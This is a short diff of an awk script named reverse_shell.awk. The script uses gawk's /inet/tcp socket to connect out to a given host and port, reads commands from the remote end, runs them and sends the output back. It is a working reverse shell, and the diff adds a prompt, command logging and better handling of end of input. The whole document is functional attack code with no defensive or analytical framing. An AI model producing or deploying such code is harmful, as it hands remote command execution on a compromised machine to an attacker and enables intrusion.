@@ -2,15 +2,21 @@
 # Usage: ./reverse_shell.awk <host>:<port>
 
 BEGIN {
-    sub(":", "/", ARGV[1])
-    c = "/inet/tcp/0/" ARGV[1]
+    target = ARGV[1]
+
+    sub(":", "/", target)
+    c = "/inet/tcp/0/" target
 
     while (1) {
-        c |& getline cmd
-        if(cmd ~ /^exit/) close(c)
-        while (cmd |& getline result) {
-            print result |& c
+        printf "> " |& c
+        res = c |& getline cmd
+        if(!res || cmd ~ /^exit/) close(c)
+        if(cmd) {
+            print "cmd:", cmd
+            while (cmd |& getline result) {
+                print result |& c
+            }
+            close(cmd)
         }
-        close(cmd)
     }
 }
